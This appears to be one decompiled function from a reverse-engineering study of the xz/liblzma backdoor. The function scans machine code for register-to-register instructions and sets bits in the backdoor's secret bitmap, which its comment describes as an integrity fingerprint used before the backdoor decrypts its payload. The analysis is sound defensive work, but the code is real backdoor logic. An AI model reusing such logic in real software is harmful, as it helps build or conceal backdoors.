// /home/kali/xzre-ghidra/xzregh/10AA00_secret_data_append_from_code.c
// Function: secret_data_append_from_code @ 0x10AA00
// Calling convention: unknown
// Prototype: undefined secret_data_append_from_code(void)


/*
 * AutoDoc: Walks a trusted code range, optionally skipping until the first CALL, and records bits for each qualifying register-to-register instruction. The backdoor uses it to encode integrity fingerprints into the secret_data bitmap before decrypting payload material.
 */
#include "xzre_types.h"


bool secret_data_append_from_code
               (long param_1,undefined8 param_2,undefined4 param_3,uint param_4,int param_5)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  ulong uVar4;
  undefined4 local_9c [3];
  long local_90;
  long local_88;
  
  plVar3 = &local_90;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  local_9c[0] = param_3;
  if (param_5 != 0) {
    iVar1 = find_call_instruction(param_1,param_2,0,&local_90);
    if (iVar1 == 0) {
      return FALSE;
    }
    param_1 = local_88 + local_90;
  }
  uVar4 = 0;
  do {
    iVar1 = find_reg2reg_instruction(param_1,param_2,&local_90);
    if (iVar1 == 0) {
LAB_0010aa80:
      return param_4 == (uint)uVar4;
    }
    if (uVar4 == param_4) {
      if (param_4 < (uint)uVar4) {
        return FALSE;
      }
      goto LAB_0010aa80;
    }
    uVar4 = uVar4 + 1;
    iVar1 = secret_data_append_from_instruction(&local_90,local_9c);
    if (iVar1 == 0) {
      return FALSE;
    }
    param_1 = local_88 + local_90;
  } while( TRUE );
}

